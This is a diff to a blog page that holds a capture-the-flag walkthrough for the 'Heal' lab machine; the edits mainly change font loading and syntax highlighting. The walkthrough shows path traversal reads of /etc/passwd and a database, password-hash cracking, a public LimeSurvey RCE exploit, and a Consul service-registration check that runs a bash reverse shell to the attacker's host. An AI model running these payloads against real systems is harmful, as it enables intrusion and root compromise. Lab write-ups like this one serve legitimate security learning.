@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -83,7 +89,7 @@
 <h2 class="wp-stage-title">nginx up front, Ruby-on-Rails API in the back.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nmap -sV -sC -A -T5 -p- 10.10.11.46 --min-rate 2000
+<pre class="wp-term-body"><code class="hljs language-bash">$ nmap -sV -sC -A -T5 -p- 10.10.11.46 --min-rate 2000
 22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
 80/tcp open  http     nginx 1.18.0 (Ubuntu)
 |_http-title: Heal
@@ -111,21 +117,21 @@ $ nmap -T5 -A api.heal.htb
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">burp · GET /download</span></div>
-<pre class="wp-term-body"><code class="language-http">GET /download?filename=../../../etc/passwd HTTP/1.1
-Host: api.heal.htb
-Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+<pre class="wp-term-body"><code class="hljs language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/download?filename=../../../etc/passwd</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.heal.htb
+<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiJ9...
 
-HTTP/1.1 200 OK
-root:x:0:0:root:/root:/bin/bash
+<span class="language-elixir"><span class="hljs-title class_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-title class_">OK</span>
+<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
 ...
-ralph:x:1000:1000:,,,:/home/ralph:/bin/bash</code></pre>
+<span class="hljs-symbol">ralph:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/ralph</span><span class="hljs-symbol">:/bin/bash</span></span></code></pre>
 </div>
 
 
 <p>Rails config sits at <code>config/database.yml</code> — dev uses sqlite.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">burp · GET /download</span></div>
-<pre class="wp-term-body"><code class="language-bash">GET /download?filename=../../config/database.yml
+<pre class="wp-term-body"><code class="hljs language-bash">GET /download?filename=../../config/database.yml
 → development: adapter: sqlite3 database: storage/development.sqlite3
 
 GET /download?filename=../../storage/development.sqlite3
@@ -147,7 +153,7 @@ GET /download?filename=../../storage/development.sqlite3
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@hashcat</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ hashcat -m 3200 -a 0 hash.txt rockyou.txt
+<pre class="wp-term-body"><code class="hljs language-bash">$ hashcat -m 3200 -a 0 hash.txt rockyou.txt
 $2a$12$[BCRYPT-HASH] : [REDACTED]</code></pre>
 </div>
 
@@ -165,8 +171,8 @@ $2a$12$[BCRYPT-HASH] : [REDACTED]</code></pre>
 <div class="wp-stage-body"><p>Public exploit from <code>N4s1rl1/Limesurvey-6.6.4-RCE</code> ships the full chain: CSRF token → login → upload malicious plugin zip → activate → trigger.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ python3 exploit.py http://take-survey.heal.htb ralph [REDACTED] 80
-[INFO]    Retrieving CSRF token for login ...
+<pre class="wp-term-body"><code class="hljs language-bash">$ python3 exploit.py http://take-survey.heal.htb ralph [REDACTED] 80
+[INFO]    Retrieving CSRF token <span class="hljs-keyword">for</span> login ...
 [SUCCESS] CSRF Token Retrieved
 [INFO]    Sending Login Request ...
 [SUCCESS] Login Successful
@@ -186,11 +192,11 @@ $2a$12$[BCRYPT-HASH] : [REDACTED]</code></pre>
 <p>Listener catches the callback:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · www-data@heal</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 4444
+<pre class="wp-term-body"><code class="hljs language-bash">$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.83] from (UNKNOWN) [10.10.11.46] 55258
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+$ <span class="hljs-built_in">id</span>
+uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)</code></pre>
 </div></div>
 </section>
 
@@ -203,7 +209,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 <div class="wp-stage-body"><p>Rifling through <code>/var/www/limesurvey/application/config/config.php</code> leaks PostgreSQL creds — but Postgres permissions aren&#39;t enough for user pivot. <code>ss -tuln</code> is the real find:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · www-data@heal</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ ss -tuln
+<pre class="wp-term-body"><code class="hljs language-bash">$ ss -tuln
 LISTEN  127.0.0.1:8500  (HashiCorp Consul HTTP API)
 LISTEN  127.0.0.1:8301
 LISTEN  127.0.0.1:8302
@@ -214,7 +220,7 @@ LISTEN  127.0.0.1:8600</code></pre>
 <p><span class="hl-cool">8500</span> is Consul. With no ACL tokens, anyone can <code>PUT /v1/agent/service/register</code> with a <code>Check</code> block that runs an arbitrary command — <span class="hl-red">as root</span>.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · www-data@heal</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d &#39;{
+<pre class="wp-term-body"><code class="hljs language-bash">$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d <span class="hljs-string">&#x27;{
   &quot;Name&quot;: &quot;pwned&quot;,
   &quot;ID&quot;:   &quot;pwned&quot;,
   &quot;Port&quot;: 9999,
@@ -222,17 +228,17 @@ LISTEN  127.0.0.1:8600</code></pre>
     &quot;Args&quot;: [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.83/6969 0&gt;&amp;1&quot;],
     &quot;Interval&quot;: &quot;10s&quot;
   }
-}&#39;</code></pre>
+}&#x27;</span></code></pre>
 </div>
 
 
 <p>Second listener:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · root@heal</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 6969
+<pre class="wp-term-body"><code class="hljs language-bash">$ nc -lvnp 6969
 connect to [10.10.16.83] from heal.htb [10.10.11.46] 53994
-root@heal:/# cat /root/root.txt
-root@heal:/# cat /home/ron/user.txt</code></pre>
+root@heal:/<span class="hljs-comment"># cat /root/root.txt</span>
+root@heal:/<span class="hljs-comment"># cat /home/ron/user.txt</span></code></pre>
 </div>
 
 
@@ -268,9 +274,6 @@ root@heal:/# cat /home/ron/user.txt</code></pre>
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
